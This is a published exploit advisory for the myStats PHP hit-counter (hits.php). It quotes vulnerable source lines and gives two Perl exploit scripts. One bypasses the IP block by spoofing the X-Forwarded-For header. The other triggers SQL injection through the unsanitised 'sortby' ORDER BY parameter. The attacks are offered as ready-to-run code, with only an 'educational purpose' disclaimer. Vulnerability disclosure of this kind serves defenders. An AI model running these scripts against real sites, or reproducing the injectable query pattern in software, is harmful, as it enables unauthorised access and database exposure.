@@ -1,0 +1,110 @@
+# myStats (hits.php) Multiple Remote Vulnerabilities Exploit
+# url: http://mywebland.com/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: All Hackers and milw0rm website
+
+---------------------
+Break System Block IP
+---------------------
+
+<<hits.php>>
+
+7: if (@getenv("HTTP_X_FORWARDED_FOR")) 
+
+   { $u_ip = @getenv("HTTP_X_FORWARDED_FOR"); } 
+
+   else { $u_ip = @getenv("REMOTE_ADDR"); } 
+
+
+
+   if ($u_ip == BLOCK_IP) 
+
+    { return 1; 
+
+13:  exit; } 
+
+<<config.php>>
+
+11: define("BLOCK_IP", "127.0.0.1"); 
+
+<<exploit.pl>>
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $web="http://localhost/hits.php";
+my $ua=LWP::UserAgent->new();
+$ua->default_header('X-Forwarded-For' => "127.1.1.1");
+my $respuesta=HTTP::Request->new(GET=>$web);
+$ua->timeout(30);
+my $response=$ua->request($respuesta);
+$contenido=$response->content;
+if ($response->is_success)
+{
+open(FILE,">>results.txt");
+print FILE "$contenido\n";
+close(FILE);
+print "\n[+] Exploit Succesful!\n\n";
+}
+else
+{
+print "\n[-] Exploit Failed!\n\n";
+}
+
+<<proof of concept>>
+
+$ua->default_header('X-Forwarded-For' => "127.1.1.1"); --> BREAK BLOCK_IP
+
+-------------
+SQL Injection
+-------------
+
+<<hits.php>>
+
+63: if (isset($_GET['sortby']))
+
+    {$sortby = $_GET['sortby'];}
+
+    else
+
+    { $sortby =  'timestamp' ;}
+
+
+    $sql = "SELECT * FROM " . LOG_TBL . " ORDER BY " . $sortby." DESC LIMIT 0, ". DISPLAY_LOG_NO ;
+
+69: $querylog = mysql_query($sql) or die("Line 117 Cannot query the database.<br>" . mysql_error());
+
+<<exploit.pl>>
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $web="http://localhost/hits.php?sortby=1'";
+my $ua=LWP::UserAgent->new();
+my $respuesta=HTTP::Request->new(GET=>$web);
+$ua->timeout(30);
+my $response=$ua->request($respuesta);
+$contenido=$response->content;
+if ($response->is_success)
+{
+if($contenido =~ /You have an error in your SQL syntax;/)
+{
+print "\n[+] Exploit Succesful!\n";
+print "\n[+] Content:\n";
+print "$contenido\n\n";
+}
+}
+else
+{
+print "\n[-] Exploit Failed!\n\n";
+}
+
+# milw0rm.com [2008-10-15]
